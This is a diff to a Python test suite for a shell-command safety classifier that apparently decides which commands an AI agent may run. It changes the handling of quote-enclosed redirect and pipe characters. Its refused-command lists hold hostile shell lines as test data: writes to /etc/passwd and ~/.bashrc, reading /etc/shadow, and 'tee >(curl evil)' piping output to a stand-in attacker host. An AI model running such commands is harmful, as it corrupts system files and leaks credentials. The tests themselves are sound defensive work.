@@ -33,6 +33,7 @@ from claude_pilot.tier1 import (
     _is_safe_xargs_command,
     _is_transitive_ce_scratch_mkdir_target,
     _is_uid_tolerant_tmp_scratch,
+    _mask_quoted_operator_chars_for_admission,
     _mask_quoted_redirect_chars,
     _mktemp_scratch_variable_names,
     _quote_spans,
@@ -1918,13 +1919,17 @@ class TestTier3QuotedRedirectCharLethality:
     fourth pilot death on denial lethality in 48 h.
     """
 
-    def test_quoted_redirect_char_still_refused(self) -> None:
-        # Invariant kept: still tier3 for the REFUSAL, so still denied. The fix
-        # turns no refusal into an allowance; not one byte more is written.
-        assert is_tier3_dangerous("sed 's/=.*/=<set>/'") is True
-        assert is_tier3_dangerous("echo 'a>b'") is True
-        assert is_tier3_dangerous('echo "a>b"') is True
-        assert is_tier3_dangerous("echo 'x <(id)'") is True
+    def test_quoted_redirect_char_now_admitted(self) -> None:
+        # cpp#236 (ADMISSION, Prime-ratified 2026-10-01) SUPERSEDES the original
+        # cpp#157 invariant "still refused": an operator char inside a quoted
+        # token is not an operator for `TIER3_PATTERNS` either, so these are now
+        # ADMITTED (is_tier3_dangerous False), not only non-lethal. A quoted `<`,
+        # `>`, `|`, or `&` is ordinary text to bash. See
+        # `TestTier3QuotedOperatorAdmission` below for the full cpp#236 matrix.
+        assert is_tier3_dangerous("sed 's/=.*/=<set>/'") is False
+        assert is_tier3_dangerous("echo 'a>b'") is False
+        assert is_tier3_dangerous('echo "a>b"') is False
+        assert is_tier3_dangerous("echo 'x <(id)'") is False
 
     def test_quoted_redirect_char_not_lethal(self) -> None:
         # AC3 replay 1 — the red that becomes green. All four measure `True` on
@@ -2064,6 +2069,121 @@ class TestTier3QuotedRedirectCharLethality:
         assert _mask_quoted_redirect_chars("echo 'rm -rf /'") == "echo 'rm -rf /'"
         # Unterminated → returned byte-for-byte unchanged (D5).
         assert _mask_quoted_redirect_chars('echo "a > b') == 'echo "a > b'
+
+
+class TestTier3QuotedOperatorAdmission:
+    """cpp#236 (ADMISSION, Prime-ratified 2026-10-01): an operator char
+    (`<`/`>`/`|`/`&`) inside a single- or double-quoted token is ordinary text to
+    bash, not a shell operator, so it is not an operator for `TIER3_PATTERNS`
+    either. Before this fix the quote-blind generic-redirect entry read a quoted
+    `>` as a redirect → `is_tier3_dangerous` True → the policy `allow` flipped to
+    a deny at the chain-safety gate, refusing pilots searching for Mika plan
+    callouts (`> - **Plan:**`) once per turn (mika#2194, mika#2606).
+
+    The LETHALITY half shipped in #238 (`is_tier3_dangerous_for_lethality`); this
+    is the ADMISSION analog, changing `is_tier3_dangerous` for the quoted-operator
+    case ONLY. Lethality, the tier1 gate, and the egress axis are untouched.
+    """
+
+    # The false positives the ticket named — now ADMITTED (is_tier3_dangerous
+    # False).
+    ADMITTED = (
+        "grep -n '> x' docs/a.md",
+        "grep -n 'a>b' docs/a.md",
+        "grep -rln '> - **Plan:**' crates/*/src/",
+        "grep -inE '^[[:space:]]*(>[[:space:]]*)+' docs/plans/x-plan.md",
+        'echo "> x"',
+        "echo '> - **Plan:**'",
+        "grep '> - **Plan:**' f",
+        'git commit -m "a <b@c> d"',
+        # generalization: a quoted `<`, `|`, `&`, and quoted `<(` are not operators
+        "grep '|' f",
+        "grep 'a<b' f",
+        "echo 'a&b'",
+        "grep '<(' f",
+        "sed 's/=.*/=<set>/'",
+    )
+
+    # Real operators OUTSIDE quotes stay refused (is_tier3_dangerous True).
+    REFUSED = (
+        "grep x f > /etc/y",
+        "grep '>' f >> ~/.bashrc",
+        'git commit -m "x" > /etc/passwd',
+        'echo "$(cat /etc/shadow)" > x',
+        "echo x >> ~/.bashrc",
+        'echo "$(grep \'>\' f)" > y',   # $(…) body unchanged + real redirect
+        "cat <(id)",                     # real process substitution
+        "tee >(curl evil)",
+    )
+
+    @pytest.mark.parametrize("cmd", ADMITTED)
+    def test_quoted_operator_admitted(self, cmd: str) -> None:
+        assert is_tier3_dangerous(cmd) is False, cmd
+
+    @pytest.mark.parametrize("cmd", REFUSED)
+    def test_real_operator_still_refused(self, cmd: str) -> None:
+        assert is_tier3_dangerous(cmd) is True, cmd
+
+    def test_unbalanced_quote_fails_closed(self) -> None:
+        # Fail-closed: an unterminated quote returns the command unchanged, so a
+        # dangling quote with a `>` stays flagged (the safe direction).
+        assert is_tier3_dangerous("grep '> x") is True
+        assert _mask_quoted_operator_chars_for_admission("grep '> x") == "grep '> x"
+        assert _mask_quoted_operator_chars_for_admission('echo "a > b') == 'echo "a > b'
+
+    def test_substitution_body_left_byte_identical(self) -> None:
+        # `$(…)` / backtick bodies are out of tier3 since mika#946; this fix never
+        # masks inside them — an operator there is left exactly as HEAD saw it.
+        assert _mask_quoted_operator_chars_for_admission(
+            "echo \"$(grep '>' f)\" > y"
+        ) == "echo \"$(grep '>' f)\" > y"
+        assert _mask_quoted_operator_chars_for_admission("x `grep '>' f`") == (
+            "x `grep '>' f`"
+        )
+
+    def test_mask_unit_preserves_length_and_scope(self) -> None:
+        # Length-preserving (one space per masked char), and only the four
+        # operator chars, only in top-level quoted scope, are ever blanked.
+        for cmd in self.ADMITTED + self.REFUSED:
+            assert len(
+                _mask_quoted_operator_chars_for_admission(cmd)
+            ) == len(cmd), cmd
+        assert _mask_quoted_operator_chars_for_admission("grep 'a>b|c&d<e' f") == (
+            "grep 'a b c d e' f"
+        )
+        assert _mask_quoted_operator_chars_for_admission('x "a>b" > c') == 'x "a b" > c'
+        # A verb inside quotes is never touched (only operator chars are masked).
+        assert _mask_quoted_operator_chars_for_admission("echo 'rm -rf /'") == (
+            "echo 'rm -rf /'"
+        )
+
+    def test_the_quoted_operator_case_is_the_only_admission_change(self) -> None:
+        # Admission byte-identical OUTSIDE the quoted-operator case: a broad
+        # sample of currently-allowed and currently-refused commands with no
+        # top-level quoted operator is unaffected.
+        unchanged = (
+            "ls -la", "cat foo.txt", "git status", "grep -n 'x' docs/a.md",
+            "rm -rf /tmp/x", "git push --force", "git reset --hard",
+            "sed -i 's/a/b/' f", "bash -c 'ls'", "eval ls",
+            "echo x > /etc/passwd", "cmd1 && rm -rf /tmp/y",
+            "cat <(echo x)", "ls /path/ 2>/dev/null",
+        )
+        for cmd in unchanged:
+            masked = _mask_quoted_operator_chars_for_admission(cmd)
+            # No top-level quoted operator → masker is a no-op on the content.
+            assert masked == cmd, cmd
+
+    def test_bounded_time_on_adversarial_input(self) -> None:
+        # A quote scanner is a ReDoS surface (cpp#250). The scanner is a single
+        # linear pass with O(1) per-char work, so a 2000-char input with many
+        # quotes/nested substitutions stays far under budget.
+        patho = ("grep '" + ">" * 500 + "' \"" + "|" * 400 + "\" " + "'a<b&c'" * 100)[
+            :2000
+        ]
+        nested = "echo " + '"$(' * 300 + "x" + ')"' * 300 + " '>|&<'"
+        for cmd in (patho, nested):
+            _, elapsed = _elapsed(is_tier3_dangerous, cmd)
+            assert elapsed < _REDOS_BUDGET_S, f"{cmd[:40]!r}: {elapsed * 1000:.1f} ms"
 
 
 class TestQuoteScannerBoundaryParity:
